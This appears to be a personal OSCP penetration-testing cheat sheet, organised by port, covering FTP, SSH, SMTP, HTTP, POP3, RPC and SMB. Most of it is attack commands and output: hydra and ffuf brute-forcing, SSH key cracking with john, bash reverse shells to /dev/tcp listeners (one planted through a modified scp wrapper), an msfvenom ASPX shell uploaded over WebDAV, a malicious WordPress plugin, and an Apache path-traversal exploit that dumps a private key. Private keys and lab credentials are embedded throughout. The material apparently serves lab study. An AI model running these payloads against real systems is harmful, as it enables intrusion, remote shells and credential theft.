## Example Cheat Sheet <img src="https://media.giphy.com/media/M9gbBd9nbDrOTu1Mqx/giphy.gif" width="100"/>
## If anything is missing refer here
````
https://github.com/0xsyr0/oscp
````
## Service Enumeration <img src="https://cdn-icons-png.flaticon.com/512/6989/6989458.png" width="40" height="40" />
### Network Enumeration
````
ping $IP #63 ttl = linux #127 ttl = windows
````
````
nmap -p- --min-rate 1000 $IP
nmap -p- --min-rate 1000 $IP -Pn #disables the ping command and only scans ports
````
````
nmap -p <ports> -sV -sC -A $IP
````
### Stealth Scan
````
nmap -sS -p- --min-rate=1000 10.11.1.229 -Pn #stealth scans
````
### Rust Scan
````
target/release/rustscan -a 10.11.1.252
````
### UDP Scan
````
sudo nmap -F -sU -sV $IP
````
### Script to automate Network Enumeration
````
#!/bin/bash

target="$1"
ports=$(nmap -p- --min-rate 1000 "$target" | grep "^ *[0-9]" | grep "open" | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//')

echo "Running second nmap scan with open ports: $ports"

nmap -p "$ports" -sC -sV -A "$target"
````
### Autorecon
````
autorecon 192.168.238.156 --nmap-append="--min-rate=2500" --exclude-tags="top-100-udp-ports" --dirbuster.threads=30 -vv
````
### Port Enumeration
#### FTP port 21
##### Emumeration
````
ftp -A $IP
ftp $IP
anonymous:anonymous
put test.txt #check if it is reflected in a http port
````
###### Upload binaries
````
ftp> binary
200 Type set to I.
ftp> put winPEASx86.exe
````
##### Brute Force
````
hydra -l steph -P /usr/share/wfuzz/wordlist/others/common_pass.txt 10.1.1.68 -t 4 ftp
hydra -l steph -P /usr/share/wordlists/rockyou.txt 10.1.1.68 -t 4 ftp
````
##### Downloading files recursively
````
wget -r ftp://steph:billabong@10.1.1.68/
wget -r ftp://anonymous:anonymous@192.168.204.157/
````
````
find / -name Settings.*  2>/dev/null #looking through the files
````
##### Exiftool
````
ls
BROCHURE-TEMPLATE.pdf  CALENDAR-TEMPLATE.pdf  FUNCTION-TEMPLATE.pdf  NEWSLETTER-TEMPLATE.pdf  REPORT-TEMPLATE.pdf
````
````
exiftool *                                             

======== FUNCTION-TEMPLATE.pdf
ExifTool Version Number         : 12.57
File Name                       : FUNCTION-TEMPLATE.pdf
Directory                       : .
File Size                       : 337 kB
File Modification Date/Time     : 2022:11:02 00:00:00-04:00
File Access Date/Time           : 2023:05:28 22:42:28-04:00
File Inode Change Date/Time     : 2023:05:28 22:40:43-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Language                        : en-US
Tagged PDF                      : Yes
Author                          : Cassie
Creator                         : Microsoft® Word 2016
Create Date                     : 2022:11:02 11:38:02+02:00
Modify Date                     : 2022:11:02 11:38:02+02:00
Producer                        : Microsoft® Word 2016
======== NEWSLETTER-TEMPLATE.pdf
ExifTool Version Number         : 12.57
File Name                       : NEWSLETTER-TEMPLATE.pdf
Directory                       : .
File Size                       : 739 kB
File Modification Date/Time     : 2022:11:02 00:00:00-04:00
File Access Date/Time           : 2023:05:28 22:42:37-04:00
File Inode Change Date/Time     : 2023:05:28 22:40:44-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 2
Language                        : en-US
Tagged PDF                      : Yes
Author                          : Mark
Creator                         : Microsoft® Word 2016
Create Date                     : 2022:11:02 11:11:56+02:00
Modify Date                     : 2022:11:02 11:11:56+02:00
Producer                        : Microsoft® Word 2016
======== REPORT-TEMPLATE.pdf
ExifTool Version Number         : 12.57
File Name                       : REPORT-TEMPLATE.pdf
Directory                       : .
File Size                       : 889 kB
File Modification Date/Time     : 2022:11:02 00:00:00-04:00
File Access Date/Time           : 2023:05:28 22:42:49-04:00
File Inode Change Date/Time     : 2023:05:28 22:40:45-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 2
Language                        : en-US
Tagged PDF                      : Yes
Author                          : Robert
Creator                         : Microsoft® Word 2016
Create Date                     : 2022:11:02 11:08:26+02:00
Modify Date                     : 2022:11:02 11:08:26+02:00
Producer                        : Microsoft® Word 2016
    5 image files read
````

#### SSH port 22
##### putty tools
````
sudo apt upgrade && sudo apt install putty-tools
````
##### puttygen 
````
cat keeper.txt          
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0

````

````
puttygen keeper.txt -O private-openssh -o id_rsa
````
````
chmod 600 id_rsa
````
````
ssh root@10.10.11.227 -i id_rsa
````

##### Emumeration
##### Exploitation
````
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa USERB@10.11.1.141 -t 'bash -i >& /dev/tcp/192.168.119.140/443 0>&1'

nc -nvlp 443
````
###### no matching key exchange method found.
````
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1\
 -oHostKeyAlgorithms=+ssh-rsa\
 -oCiphers=+aes256-cbc\
 admin@10.11.1.252 -p 22000
````
##### Brute Force
````
hydra -l userc -P /usr/share/wfuzz/wordlist/others/common_pass.txt 10.1.1.27 -t 4 ssh
hydra -L users.txt -p WallAskCharacter305 192.168.153.139 -t 4 ssh -s 42022
````
##### Private key obtained
````
chmod 600 id_rsa
ssh userb@172.16.138.14 -i id_rsa
````
##### Public key obtained
````
cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8J1/BFjH/Oet/zx+bKUUop1IuGd93QKio7Dt7Xl/J91c2EvGkYDKL5xGbfQRxsT9IePkVINONXQHmzARaNS5lE+SoAfFAnCPnRJ+KrnJdPxYf4OQEiAxHwRJHvbYaxEEuye7GKP6V0MdSvDtqKsFk0YRFVdPKuforL/8SYtSfqYUywUJ/ceiZL/2ffGGBJ/trQJ2bBL4QcOg05ZxrEoiTJ09+Sw3fKrnhNa5/NzYSib+0llLtlGbagBh3F9n10yqqLlpgTjDp5PKenncFiKl1llJlQGcGhLXxeoTI59brTjssp8J+z6A48h699CexyGe02GZfKLLLE+wKn/4luY0Ve8tnGllEdNFfGFVm7WyTmAO2vtXMmUbPaavDWE9cJ/WFXovDKtNCJxpyYVPy2f7aHYR37arLL6aEemZdqzDwl67Pu5y793FLd41qWHG6a4XD05RHAD0ivsJDkypI8gMtr3TOmxYVbPmq9ecPFmSXxVEK8oO3qu2pxa/e4izXBFc= USERZ@example #new user found
````
##### Cracking Private Key
````
ssh2john id_ecdsa > id_ecdsa.hash

cat id_ecdsa.hash 
id_ecdsa:$sshng$6$16$0ef9e445850d777e7da427caa9b729cc$359$6f70656e7373682d6b65792d7631000000000a6165733235362d6374720000000662637279707400000018000000100ef9e445850d777e7da427caa9b729cc0000001000000001000000680000001365636473612d736861322d6e69737470323536000000086e697374703235360000004104afad8408da4537cd62d9d3854a02bf636ce8542d1ad6892c1a4b8726fbe2148ea75a67d299b4ae635384c7c0ac19e016397b449602393a98e4c9a2774b0d2700000000b0d0768117bce9ff42a2ba77f5eb577d3453c86366dd09ac99b319c5ba531da7547145c42e36818f9233a7c972bf863f6567abd31b02f266216c7977d18bc0ddf7762c1b456610e9b7056bef0affb6e8cf1ec8f4208810f874fa6198d599d2f409eaa9db6415829913c2a69da7992693de875b45a49c1144f9567929c66a8841f4fea7c00e0801fe44b9dd925594f03a58b41e1c3891bf7fd25ded7b708376e2d6b9112acca9f321db03ec2c7dcdb22d63$16$183

john --wordlist=/usr/share/wordlists/rockyou.txt id_ecdsa.hash

fireball         (id_ecdsa)
````
##### Finding Private keys
````
/etc/ssh/*pub #Use this to view the type of key you have aka (ecdsa)

ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK6SiUV5zqxqNJ9a/p9l+VpxxqiXnYri40OjXMExS/tP0EbTAEpojn4uXKOgR3oEaMmQVmI9QLPTehCFLNJ3iJo= root@example01
````
````
/home/userE/.ssh/id_ecdsa.pub #public key
/home/userE/.ssh/id_ecdsa #private key
````
##### Errors
this means no password! Use it to login as a user on the box
````
ssh2john id_rsa > id_rsa.hash             
id_rsa has no password!
````
This means you are most likely using the private key for the wrong user, try doing a cat /etc/passwd in order to find other users to try it on. This error came from me trying a private key on the wrong user and private key which has no password asking for a password
````
ssh root@192.168.214.125 -p43022 -i id_rsa  
Warning: Identity file id_rsa not accessible: No such file or directory.
The authenticity of host '[192.168.214.125]:43022 ([192.168.214.125]:43022)' can't be established.
ED25519 key fingerprint is SHA256:rNaauuAfZyAq+Dhu+VTKM8BGGiU6QTQDleMX0uANTV4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.214.125]:43022' (ED25519) to the list of known hosts.
root@192.168.214.125's password: 
Permission denied, please try again.
root@192.168.214.125's password: 
Permission denied, please try again.
root@192.168.214.125's password: 
root@192.168.214.125: Permission denied (publickey,password).

````
##### Downloading files
````
scp -r -i id_rsa USERZ@192.168.214.149:/path/to/file/you/want .
````
##### RCE with scp
````
kali@kali:~/home/userA$ cat scp_wrapper.sh 
#!/bin/bash
case $SSH_ORIGINAL_COMMAND in
 'scp'*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo "ACCESS DENIED."
    scp
    ;;
esac
````
````
#!/bin/bash
case $SSH_ORIGINAL_COMMAND in
 'scp'*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo "ACCESS DENIED."
    bash -i >& /dev/tcp/192.168.18.11/443 0>&1
    ;;
esac
````
````
scp -i .ssh/id_rsa scp_wrapper.sh userA@192.168.120.29:/home/userA/
````
````
kali@kali:~$ sudo nc -nlvp 443
````
````
kali@kali:~/home/userA$ ssh -i .ssh/id_rsa userA@192.168.120.29
PTY allocation request failed on channel 0
ACCESS DENIED.
````
````
connect to [192.168.118.11] from (UNKNOWN) [192.168.120.29] 48666
bash: cannot set terminal process group (932): Inappropriate ioctl for device
bash: no job control in this shell
userA@sorcerer:~$ id
id
uid=1003(userA) gid=1003(userA) groups=1003(userA)
userA@sorcerer:~$
````
#### Telnet port 23
##### Login
````
telnet -l jess 10.2.2.23
````
#### SMTP port 25
````
nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25
````
````
nc -nv $IP 25
telnet $IP 25
EHLO ALL
VRFY <USER>
````
##### Exploits Found
SMTP PostFix Shellshock
````
https://gist.github.com/YSSVirus/0978adadbb8827b53065575bb8fbcb25
python2 shellshock.py 10.11.1.231 useradm@mail.local 192.168.119.168 139 root@mail.local #VRFY both useradm and root exist
````
#### DNS port 53
````
dnsrecon -d heist.example -n 192.168.54.165 -t axfr
````
#### HTTP(S) port 80,443
##### FingerPrinting
````
whatweb -a 3 $IP
nikto -ask=no -h http://$IP 2>&1
````
##### Directory Busting
##### Dirb
````
dirb http://target.com
````
##### ffuf
````
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://$IP/FUZZ
ffuf -w /usr/share/wordlists/dirb/big.txt -u http://$IP/FUZZ
````
###### gobuster
````
gobuster dir -u http://10.11.1.71:80/site/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e txt,php,html,htm
gobuster dir -u http://10.11.1.71:80/site/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e txt,php,html,htm
````
###### feroxbuster
````
feroxbuster -u http://<$IP> -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 

feroxbuster -u http://192.168.138.249:8000/cms/ -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e -C 404 #if we dont want to see any denied

feroxbuster -u http://192.168.138.249:8000/cms/ -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e -C 404,302 #if website redirects
````
##### api
````
curl http://$ip/api/
````
````
[{"string":"/api/","id":13},{"string":"/article/","id":14},{"string":"/article/?","id":15},{"string":"/user/","id":16},{"string":"/user/?","id":17}] 
````
````
curl http://$ip/api/user/ 
````
````
[{"login":"UserA","password":"test12","firstname":"UserA","lastname":"UserA","description":"Owner","id":10},{"login":"UserB","password":"test13","firstname":"UserB","lastname":"UserB","description":"Owner","id":30},{"login":"UserC","password":"test14","firstname":"UserC","lastname":"UserC","description":"Owner","id":6o},{"login":"UserD","password":"test15","firstname":"UserD","lastname":"UserD","description":"Owner","id":7o},{"login":"UserE","password":"test16","firstname":"UserE","lastname":"UserE","description":"Owner","id":100}]
````
##### Files of interest
````
Configuration files such as .ini, .config, and .conf files.
Application source code files such as .php, .aspx, .jsp, and .py files.
Log files such as .log, .txt, and .xml files.
Backup files such as .bak, .zip, and .tar.gz files.
Database files such as .mdb, .sqlite, .db, and .sql files.
````
##### java/apk files
````
jadx-gui
````
````
APK stands for Android Package Kit. It is the file format used by the Android operating system to distribute and install applications. An APK file contains all the necessary components and resources of an Android application, such as code, assets, libraries, and manifest files.
````
##### Brute Forcing / Fuzzing logins techniques
###### ffuf
````
ffuf -c -request request.txt -request-proto http -mode clusterbomb -fw 1 -w /usr/share/wordlists/rockyou.txt:FUZZ
````
````
POST /index.php HTTP/1.1

Host: 10.11.1.252:8000

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 42

Origin: http://10.11.1.252:8000

Connection: close

Referer: http://10.11.1.252:8000/login.php

Cookie: PHPSESSID=89i7fj326pnqqarv9c03dpcuu2

Upgrade-Insecure-Requests: 1



username=admin&password=FUZZ&submit=Log+In
````
````
[Status: 302, Size: 63, Words: 10, Lines: 1, Duration: 165ms]
    * FUZZ: asdfghjkl;'

[Status: 302, Size: 63, Words: 10, Lines: 1, Duration: 172ms]
    * FUZZ: asdfghjkl;\\'
````
````
https://cybersecnerds.com/ffuf-everything-you-need-to-know/
````
##### WebDav
###### Hacktricks
````
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav
````
###### nmap results
````
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
````
###### Exploitation w/creds
````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=80 -f aspx -o shell.aspx
````
````
curl -T 'shell.aspx' 'http://$VictimIP/' -u <username>:<password>
````
````
http://$VictimIP/shell.aspx

nc -nlvp 80  
listening on [any] 80 ...
connect to [192.168.45.191] from (UNKNOWN) [192.168.153.122] 49997
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
service\defaultservice
````
##### CMS 
###### WP Scan
````
wpscan --url http://$IP/wp/
````
###### WP Brute Forcing
````
wpscan --url http://$IP/wp/wp-login.php -U Admin --passwords /usr/share/wordlists/rockyou.txt --password-attack wp-login
````
###### simple-file-list
````
[+] simple-file-list
 | Location: http://192.168.192.105/wp-content/plugins/simple-file-list/
 | Last Updated: 2023-05-17T17:12:00.000Z
 | [!] The version is out of date, the latest version is 6.1.7
````
````
https://www.exploit-db.com/exploits/48979

Simple File List < 4.2.3 - Unauthenticated Arbitrary File Upload
````
###### Malicous Plugins
````
https://github.com/wetw0rk/malicious-wordpress-plugin
python3 wordpwn.py 192.168.119.140 443 Y

meterpreter > shell
Process 1098 created.
Channel 0 created.
python3 -c 'import pty;pty.spawn("/bin/bash")'
````
###### Drupal scan
````
droopescan scan drupal -u http://10.11.1.50:80
````
###### .git
````
sudo wget -r http://192.168.192.144/.git/ #dirb showed a .git folder
````
````
cd 192.168.192.144 #Move into the .git directory localy
````
````
sudo git show #Run a git show command in order to expose more information as below.                                                             
commit 213092183092183092138 (HEAD -> main)
Author: Stuart <luke@example.com>
Date:   Fri Nov 18 16:58:34 2022 -0500

    Security Update

diff --git a/configuration/database.php b/configuration/database.php
index 55b1645..8ad08b0 100644
--- a/configuration/database.php
+++ b/configuration/database.php
@@ -2,8 +2,9 @@
 class Database{
     private $host = "localhost";
     private $db_name = "staff";
-    private $username = "stuart@example.lab";
-    private $password = "password123";
+    private $username = "";
+    private $password = "";
+// Cleartext creds cannot be added to public repos!
     public $conn;
     public function getConnection() {
         $this->conn = null;
````
##### API
````
http://192.168.214.150:8080/search
{"query":"*","result":""}
````
````
curl -X GET "http://192.168.214.150:8080/search?query=*"
{"query":"*","result":""}

curl -X GET "http://192.168.214.150:8080/search?query=lol"
{"query":"lol","result":""}
````
##### Exploitation CVEs
````
CVE-2014-6287 https://www.exploit-db.com/exploits/49584 #HFS (HTTP File Server) 2.3.x - Remote Command Execution
````
````
CVE-2015-6518 https://www.exploit-db.com/exploits/24044 phpliteadmin <= 1.9.3 Remote PHP Code Injection Vulnerability
````
````
CVE-XXXX-XXXX https://www.exploit-db.com/exploits/25971 Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion
````
````
CVE-2009-4623 https://www.exploit-db.com/exploits/9623  Advanced comment system1.0  Remote File Inclusion Vulnerability
https://github.com/hupe1980/CVE-2009-4623/blob/main/exploit.py
````
````
CVE-2018-18619 https://www.exploit-db.com/exploits/45853 Advanced Comment System 1.0 - SQL Injection
````
##### Exploitation http versions
````
80/tcp   open  http     Apache httpd 2.4.49
````
![image](https://user-images.githubusercontent.com/127046919/235009511-9135cd2a-06b7-4a15-9ad4-378fb0e797a1.png)

###### POC
````
./50383.sh targets.txt /etc/ssh/*pub
ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK6SiUV5zqxqNJ9a/p9l+VpxxqiXnYri40OjXMExS/tP0EbTAEpojn4uXKOgR3oEaMmQVmI9QLPTehCFLNJ3iJo= root@example01

./50383.sh targets.txt /home/userE/.ssh/id_ecdsa
192.168.138.245:8000
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAO+eRFhQ
13fn2kJ8qptynMAAAAEAAAAAEAAABoAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlz
dHAyNTYAAABBBK+thAjaRTfNYtnThUoCv2Ns6FQtGtaJLBpLhyb74hSOp1pn0pm0rmNThM
fArBngFjl7RJYCOTqY5Mmid0sNJwAAAACw0HaBF7zp/0Kiunf161d9NFPIY2bdCayZsxnF
ulMdp1RxRcQuNoGPkjOnyXK/hj9lZ6vTGwLyZiFseXfRi8Dd93YsG0VmEOm3BWvvCv+26M
8eyPQgiBD4dPphmNWZ0vQJ6qnbZBWCmRPCpp2nmSaT3odbRaScEUT5VnkpxmqIQfT+p8AO
CAH+RLndklWU8DpYtB4cOJG/f9Jd7Xtwg3bi1rkRKsyp8yHbA+wsfc2yLWM=
-----END OPENSSH PRIVATE KEY-----
````
##### ? notes
##### /etc/hosts FQDN
###### Background
````
on our initial scan we were able to find a pdf file that included credentials and instructions to setup an umbraco cms. "IIS is configured to only allow access to Umbraco the server is FQDN at the moment e.g. example02.example.com, not just example02"
````
###### Initial Scan
````
nmap -p 80,443,5985,14080,47001 -sC -sV -A 192.168.138.247                                                  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-25 18:58 EDT
Nmap scan report for example02.example.com (192.168.138.247)
Host is up (0.067s latency).

PORT      STATE SERVICE  VERSION
80/tcp    open  http     Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
|_http-title: example - New Hire Information
443/tcp   open  ssl/http Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-title: example - New Hire Information
5985/tcp  open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
14080/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
47001/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unexampleble because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016|10|2012 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2012:r2
Aggressive OS guesses: Microsoft Windows Server 2016 (89%), Microsoft Windows 10 (86%), Microsoft Windows 10 1607 (86%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   51.93 ms 192.168.119.1
2   51.88 ms example02.example.com (192.168.138.247)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.34 seconds
````
###### cat /etc/hosts
````
127.0.0.1       localhost
127.0.1.1       kali
192.168.138.247 example02.example.com
````
###### New Nmap Scan
````
nmap -p 80,443,5985,14080,47001 -sC -sV -A example02.example.com
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-25 19:00 EDT
Nmap scan report for example02.example.com (192.168.138.247)
Host is up (0.092s latency).

PORT      STATE SERVICE  VERSION
80/tcp    open  http     Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
|_http-title: example - New Hire Information
443/tcp   open  ssl/http Apache httpd 2.4.54 (OpenSSL/1.1.1p PHP/8.1.10)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn: 
|_  http/1.1
|_http-title: example - New Hire Information
5985/tcp  open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
14080/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-trane-info: Problem with XML parsing of /evox/about
47001/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016|10|2012 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows Server 2016 (89%), Microsoft Windows 10 (85%), Microsoft Windows Server 2012 (85%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   100.83 ms 192.168.119.1
2   100.82 ms example02.example.com (192.168.138.247)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.21 seconds
`````
![image](https://user-images.githubusercontent.com/127046919/234426419-f8aa53ae-f5f7-4815-92d5-99dfde8ba5fb.png)


#### POP3 port 110
##### Enumerate
In this situation we used another service on port 4555 and reset the password of ryuu to test in order to login into pop3 and grab credentials for ssh. SSH later triggered an exploit which caught us a restricted shell as user ryuu
````
nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -p 110 $IP
````
````
telnet $IP 110 #Connect to pop3
USER ryuu #Login as user
PASS test #Authorize as user
list #List every message
retr 1 #retrieve the first email
````
#### RPC port 111
##### Enumerate
````
nmap -sV -p 111 --script=rpcinfo $IP
````
#### MSRPC port 135,593
##### Enumeration
````
rpcdump.py 10.1.1.68 -p 135
````
#### SMB port 139,445
Port 139
NetBIOS stands for Network Basic Input Output System. It is a software protocol that allows applications, PCs, and Desktops on a local area network (LAN) to communicate with network hardware and to transmit data across the network. Software applications that run on a NetBIOS network locate and identify each other via their NetBIOS names. A NetBIOS name is up to 16 characters long and usually, separate from the computer name. Two applications start a NetBIOS session when one (the client) sends a command to “call” another client (the server) over TCP Port 139. (extracted from here)

Port 445
While Port 139 is known technically as ‘NBT over IP’, Port 445 is ‘SMB over IP’. SMB stands for ‘Server Message Blocks’. Server Message Block in modern language is also known as Common Internet File System. The system operates as an application-layer network protocol primarily used for offering shared access to files, printers, serial ports, and other sorts of communications between nodes on a network.
##### Enumeration
###### nmap
````
nmap --script smb-enum-shares.nse -p445 $IP
nmap –script smb-enum-users.nse -p445 $IP
nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-services.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse -p445 $IP
nmap --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-cve-2017-7494.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-regsvc-dos.nse,smb-vuln-webexec.nse -p445 $IP
nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 $IP
````
###### OS Discovery
````
nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery $IP
````
smbmap
````
smbmap -H $IP
smbmap -u "user" -p "pass" -H $IP
smbmap -H $IP -u null
smbmap -H $IP -P 139 2>&1
smbmap -H $IP -P 445 2>&1
smbmap -u null -p "" -H $IP -P 139 -x "ipconfig /all" 2>&1
